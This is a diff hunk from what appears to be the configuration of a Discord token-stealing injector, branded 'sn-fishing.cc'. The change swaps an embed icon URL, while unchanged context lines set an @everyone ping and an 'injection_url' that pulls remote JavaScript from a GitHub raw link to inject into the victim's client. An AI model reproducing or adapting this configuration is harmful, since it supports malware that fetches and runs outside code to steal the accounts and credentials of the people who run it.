@@ -11,7 +11,7 @@ const config = {
   ping_on_run: false,
   ping_val: "@everyone",
   embed_name: "sn-fishing.cc",
-  embed_icon: "https://cdn.discordapp.com/attachments/988472291048439890/988586662080692324/Zo5tLqSY2l9CjuEXEuNazNpEL1hq4KPAdhR5FVdkfPPkQWJFWWa0wKAixX6NimmTMwZvufxHmLwMR7L8_Hpm_oDJQcFu4DPEiTRQFWXO4tnmBpCgstJwEZinVkOFZ9s_PA5Hrkb1ds0FGSXpf12ekdppplZGzS_iq8N7JKrNey-k-0gV4xDDg_XT9Okl5bcNyDWn1WhcTfCCdg2Rf1hR8uc.jpg".replace(/ /g, "%20"), 
+  embed_icon: "https://cdn.discordapp.com/attachments/988813048900907051/989314536152653904/8c97eb5bb60b5e7bae869b44ddad6333.gif".replace(/ /g, "%20"), 
   embed_color: 3092790, 
   injection_url: "https://raw.githubusercontent.com/oxyidz/pqt4tt/main/index.js", 
 
